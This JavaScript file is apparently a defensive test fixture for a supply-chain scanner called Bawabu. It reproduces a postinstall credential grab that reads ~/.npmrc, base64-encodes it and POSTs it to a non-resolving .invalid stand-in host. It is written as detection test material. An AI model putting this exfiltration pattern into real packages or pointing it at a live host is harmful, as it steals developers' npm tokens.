// BAWABU TEST FIXTURE #1 — harmless. Reproduces the SHAPE of a postinstall credential grab
// so Bawabu's sandbox + strace can prove they detect it. It is inert:
//   * It opens a canary path (the harness plants a fake ~/.npmrc holding npm_canary_7f3k9q).
//   * Its only "exfil" destination is a *.invalid host, which cannot resolve on the real
//     internet (RFC 6761), so the bytes can never leave. In the sandbox a fake sink logs the attempt.
// Opening a file read-only is harmless; the dead sink is the real guarantee.
const fs = require("fs");
const os = require("os");
const path = require("path");

const SINK = "https://collector.bawabu-test.invalid/collect"; // never resolves
const target = process.env.BAWABU_CANARY_NPMRC || path.join(os.homedir(), ".npmrc");

try {
  const secret = fs.readFileSync(target, "utf8");
  // In real malware this is where the token would be sent. Here the host is a black hole.
  fetch(SINK, { method: "POST", body: Buffer.from(secret).toString("base64") }).catch(() => {});
} catch {
  // No canary file present: nothing to do.
}
